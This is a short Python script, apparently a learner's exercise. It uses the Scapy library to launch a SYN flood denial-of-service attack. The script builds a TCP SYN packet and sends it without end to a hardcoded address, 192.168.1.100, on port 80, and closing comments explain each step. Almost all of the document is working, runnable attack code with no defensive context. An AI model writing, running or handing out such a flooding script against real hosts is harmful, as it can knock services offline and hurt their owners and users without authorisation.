#!/bin/python3

#Denial of service
from scapy.all import IP, TCP, send

def syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags="S")  # SYN flag
    packet = ip/tcp
    while True:
        send(packet, verbose=False)
        print(f"Sending SYN packet to {target_ip}:{target_port}")

# Start the SYN flood attack
syn_flood("192.168.1.100", 80)


#TCP(dport, flag ) creates a syn packet for the target prot 
#send(packet)Continously send packet to the target 
